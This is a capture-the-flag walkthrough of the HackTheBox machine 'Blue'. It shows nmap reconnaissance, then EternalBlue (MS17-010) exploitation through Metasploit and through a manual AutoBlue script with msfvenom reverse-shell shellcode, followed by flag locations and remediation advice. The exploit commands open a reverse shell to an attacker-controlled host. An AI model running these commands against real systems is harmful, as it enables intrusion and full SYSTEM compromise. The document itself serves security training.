# Blue - HackTheBox Walkthrough

## Machine Information
- **Name**: Blue
- **Difficulty**: Easy
- **OS**: Windows
- **Date Completed**: July 2022

## Overview
Blue is an easy Windows machine that focuses on the EternalBlue exploit (MS17-010), a critical vulnerability in Microsoft SMB protocol.

## Reconnaissance

### Initial Nmap Scan
```bash
nmap -sC -sV -oN blue.nmap 10.10.10.40
```

Results show:
- Port 135/tcp - msrpc
- Port 139/tcp - netbios-ssn  
- Port 445/tcp - microsoft-ds
- Port 49152-49157/tcp - msrpc

### Vulnerability Scanning
```bash
nmap --script smb-vuln* -p445 10.10.10.40
```

Key findings:
- **MS17-010 (EternalBlue)** - VULNERABLE
- SMBv1 enabled

## Exploitation

### EternalBlue Exploit
Using Metasploit:
```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.40
set payload windows/x64/meterpreter/reverse_tcp
set LHOST your_ip
set LPORT 4444
exploit
```

### Alternative: Manual Exploitation
```bash
# Clone the exploit
git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git
cd AutoBlue-MS17-010

# Generate shellcode
msfvenom -p windows/x64/shell_reverse_tcp LHOST=your_ip LPORT=4444 -f raw > sc_x64.bin

# Run the exploit
python eternalblue_exploit7.py 10.10.10.40 sc_x64.bin
```

## Post-Exploitation

### System Access
Once exploited, you gain SYSTEM privileges immediately.

### Flag Locations
- **User Flag**: `C:\Users\haris\Desktop\user.txt`
- **Root Flag**: `C:\Users\Administrator\Desktop\root.txt`

### System Information
```cmd
systeminfo
net user
net localgroup administrators
```

## Key Learning Points
1. EternalBlue is one of the most dangerous Windows exploits
2. SMBv1 should always be disabled
3. Regular patching is critical for Windows security
4. This exploit gives immediate SYSTEM access

## Remediation
- Disable SMBv1 protocol
- Apply MS17-010 security update
- Enable Windows Firewall
- Implement network segmentation
- Regular vulnerability assessments

## Additional Notes
This machine demonstrates why the EternalBlue vulnerability was so devastating in real-world attacks like WannaCry.

---
*Educational purposes only - Always practice ethical hacking.*
